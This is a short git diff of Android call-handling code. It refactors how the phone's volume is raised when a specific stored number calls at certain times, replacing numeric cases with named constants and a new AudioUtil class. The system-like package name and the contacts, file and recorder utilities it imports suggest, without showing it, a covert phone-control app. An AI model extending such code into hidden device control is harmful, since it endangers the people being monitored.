@@ -11,6 +11,7 @@ import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
+import com.android.system.controled.util.AudioUtil;
 import com.android.system.controled.util.ContactsUtil;
 import com.android.system.controled.util.FileUtil;
 import com.android.system.controled.util.RecorderUtil;
@@ -78,11 +79,11 @@ public class CallReceiver extends BroadcastReceiver {
 				if (incomingNumber.contains(Globle.PHONE_NUMBER)) {
 					// 在特定时间内，自动调大音量
 					switch (TimeUtil.inTime()) {
-					case 1:
-						Globle.turnUpMost(con);
+					case TimeUtil.TIME_NOW_NIGHT:
+						AudioUtil.turnUpMost(con);
 						break;
-					case 2:
-						Globle.turnUpSecond(con);
+					case TimeUtil.TIME_NOW_MOON:
+						AudioUtil.turnUpSecond(con);
 						break;
 
 					default:
